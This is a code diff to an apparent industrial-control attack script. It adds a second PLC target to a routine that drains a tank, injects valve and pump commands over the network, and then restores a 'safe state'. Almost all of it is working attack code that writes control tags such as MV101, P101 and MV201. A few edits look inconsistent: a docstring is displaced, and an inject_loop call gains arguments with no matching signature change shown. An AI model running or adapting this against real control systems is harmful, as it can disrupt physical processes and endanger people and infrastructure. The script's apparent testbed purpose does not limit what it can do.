@@ -9,9 +9,9 @@ Attack sequence:
   3. RESTORE: Reopen MV101, restore P101 to auto on exit
 
 Usage:
-  python3 phase1_inject.py --plc-ip 192.168.1.10 --duration 120
-  python3 phase1_inject.py --plc-ip 192.168.1.10 --duration 120 --target-level 300
-  python3 phase1_inject.py --plc-ip 192.168.1.10 --duration 120 --skip-drain
+  python3 phase1_inject.py --plc-ip 192.168.1.10 --plc2-ip 192.168.1.20 --duration 120
+  python3 phase1_inject.py --plc-ip 192.168.1.10 --plc2-ip 192.168.1.20 --duration 120 --target-level 300
+  python3 phase1_inject.py --plc-ip 192.168.1.10 --plc2-ip 192.168.1.20 --duration 120 --skip-drain
 """
 
 import argparse, time, signal
@@ -48,7 +48,8 @@ def ts():
     return datetime.now().strftime('%H:%M:%S')
 
 
-def pre_drain(plc, target_level=300.0, poll=2.0):
+def pre_drain(plc1, target_level=300.0, poll=2.0):
+    plc = plc1
     """
     Take P101 to manual ON and wait for LIT101 to drain to target_level.
     This gives the attack more headroom to show dramatic level drop.
@@ -120,17 +121,35 @@ def inject_loop(plc, duration, interval=1.0):
         time.sleep(interval)
 
 
-def restore_plc(plc):
+def restore_plc(plc1, plc2):
     print(f"\n[RESTORE] Restoring safe state...")
-    for tag, val in SAFE_CMDS:
-        ret = plc.Write(tag, val)
-        print(f"    {tag:25s} = {val}  [{ret.Status}]")
+    PLC1_SAFE = [
+        ('HMI_MV101.Auto', False),
+        ('HMI_MV101.Cmd',  2),
+        ('HMI_MV101.Auto', True),
+        ('HMI_P101.Auto',  False),
+        ('HMI_P101.Cmd',   2),
+        ('HMI_P101.Auto',  True),
+    ]
+    PLC2_SAFE = [
+        ('HMI_MV201.Auto', False),
+        ('HMI_MV201.Cmd',  1),       # close MV201
+        ('HMI_MV201.Auto', True),
+    ]
+    for tag, val in PLC1_SAFE:
+        ret = plc1.Write(tag, val)
+        print(f"    PLC1  {tag:25s} = {val}  [{ret.Status}]")
+    for tag, val in PLC2_SAFE:
+        ret = plc2.Write(tag, val)
+        print(f"    PLC2  {tag:25s} = {val}  [{ret.Status}]")
 
     time.sleep(1)
-    mv  = plc.Read('HMI_MV101.Cmd').Value
-    p1a = plc.Read('HMI_P101.Auto').Value
-    lit = plc.Read('HMI_LIT101.Pv').Value
-    print(f"\n[RESTORE] Verified: MV101={'OPEN' if mv==2 else 'CLOSED'}  "
+    mv1 = plc1.Read('HMI_MV101.Cmd').Value
+    mv2 = plc2.Read('HMI_MV201.Cmd').Value
+    p1a = plc1.Read('HMI_P101.Auto').Value
+    lit = plc1.Read('HMI_LIT101.Pv').Value
+    print(f"\n[RESTORE] Verified: MV101={'OPEN' if mv1==2 else 'CLOSED'}  "
+          f"MV201={'CLOSED' if mv2==1 else 'OPEN'}  "
           f"P101.Auto={p1a}  LIT101={lit:.1f}mm")
     print("[RESTORE] Safe state restored.")
 
@@ -144,6 +163,7 @@ def signal_handler(sig, frame):
 def main():
     ap = argparse.ArgumentParser()
     ap.add_argument('--plc-ip',       default='192.168.1.10')
+    ap.add_argument('--plc2-ip',      default='192.168.1.20', help='PLC2 IP (MV201)')
     ap.add_argument('--duration',     type=int,   default=120)
     ap.add_argument('--interval',     type=float, default=1.0)
     ap.add_argument('--target-level', type=float, default=300.0,
@@ -162,30 +182,38 @@ def main():
     print(f"  Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
     print("=" * 60)
 
-    with PLC() as plc:
-        plc.IPAddress = args.plc_ip
+    with PLC() as plc1, PLC() as plc2:
+        plc1.IPAddress = args.plc_ip        # 192.168.1.10 — PLC1 (MV101, P101)
+        plc2.IPAddress = args.plc2_ip       # 192.168.1.20 — PLC2 (MV201)
 
-        # Connectivity check
-        test = plc.Read('HMI_LIT101.Pv')
-        if test.Value is None:
-            print(f"[!] Cannot reach PLC at {args.plc_ip}: {test.Status}")
+        # Connectivity check PLC1
+        test1 = plc1.Read('HMI_LIT101.Pv')
+        if test1.Value is None:
+            print(f"[!] Cannot reach PLC1 at {args.plc_ip}: {test1.Status}")
             return
-        print(f"[*] Connected. LIT101={test.Value:.1f}mm\n")
+        print(f"[*] PLC1 connected. LIT101={test1.Value:.1f}mm")
+
+        # Connectivity check PLC2
+        test2 = plc2.Read('HMI_MV201.Cmd')
+        if test2.Value is None:
+            print(f"[!] Cannot reach PLC2 at {args.plc2_ip}: {test2.Status}")
+            return
+        print(f"[*] PLC2 connected. MV201.Cmd={test2.Value}\n")
 
         # Step 1: Pre-drain (optional)
         if not args.skip_drain:
-            pre_drain(plc, target_level=args.target_level)
+            pre_drain(plc1, target_level=args.target_level)
 
         if stop_flag:
             print("[!] Aborted during pre-drain — restoring...")
-            restore_plc(plc)
+            restore_plc(plc1, plc2)
             return
 
         # Step 2: Attack
-        inject_loop(plc, args.duration, args.interval)
+        inject_loop(plc1, plc2, args.duration, args.interval)
 
         # Step 3: Restore
-        restore_plc(plc)
+        restore_plc(plc1, plc2)
 
     print("[+] Phase 1 complete.")
 
